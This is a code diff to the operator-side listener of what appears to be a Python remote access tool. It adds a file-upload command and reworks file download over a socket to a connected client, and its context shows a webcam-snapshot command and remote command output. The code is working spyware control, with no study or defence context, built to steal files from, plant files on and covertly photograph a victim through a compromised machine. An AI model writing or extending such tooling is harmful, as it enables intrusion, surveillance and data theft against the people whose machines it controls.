@@ -1,7 +1,7 @@
 import socket
 import os
 import tqdm
-
+import sys
 
 class Listening:
     def __init__(self, host, port):
@@ -33,18 +33,26 @@ class Listening:
         left = file_size
         with open(localpath, "wb") as f:
             while True:
-                # read 1024 bytes from the socket (receive)
                 bytes_read = self.client_socket.recv(self.BUFFER_SIZE)
-                if not bytes_read:
-                    break
-                # write to the file the bytes we just received
                 f.write(bytes_read)
                 left -= len(bytes_read)
-                # update the progress bar
                 progress.update(len(bytes_read))
                 if left == 0:
                     break
         return "success"
+
+    def upload(self, localpath):
+        f = open(localpath, "rb")
+        filesize = os.path.getsize(localpath)
+        self.client_socket.send(str(filesize).encode())
+        if self.client_socket.recv(self.BUFFER_SIZE).decode() == "ok":
+            while 1:
+                byte_read = f.read(self.BUFFER_SIZE)
+                if not byte_read:
+                    break
+                self.client_socket.sendall(byte_read)
+        else:
+            raise FileNotFoundError
 
     def run(self):
         while True:
@@ -56,12 +64,30 @@ class Listening:
             elif command[:8].lower() == "download":
                 try:
                     filename, localpath = command[9:].split(" ")
-                except:
+                    self.client_socket.send("download ".encode() + filename.encode())
+                    status = self.download(localpath)
+                    print(status)
+                except ValueError:
+                    print("Invalid syntax")
+                    continue
+                except BrokenPipeError:
+                    print("[-] Connection has been died..")
+                    raise BrokenPipeError
+                continue
+            elif command[:6].lower() == "upload":
+                try:
+                    localpath, remotepath = command[7:].split(" ")
+                    self.client_socket.send("upload ".encode() + remotepath.encode())
+                    self.upload(localpath)
+                except FileNotFoundError:
+                    print("Upload failed! No such file")
+                    continue
+                except ValueError:
                     print("Invalid syntax!")
                     continue
-                self.client_socket.send("download ".encode() + filename.encode())
-                status = self.download(localpath)
-                print(status)
+                except BrokenPipeError:
+                    print("[-] Connection has been died..")
+                    raise BrokenPipeError
                 continue
             elif command[:11].lower() == "webcam_snap":
                 localpath = command[12:].strip()
@@ -75,6 +101,7 @@ class Listening:
 
             # retrieve command results
             results = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")
+
             # print them
             print(results, end='')
         # close connection to the client
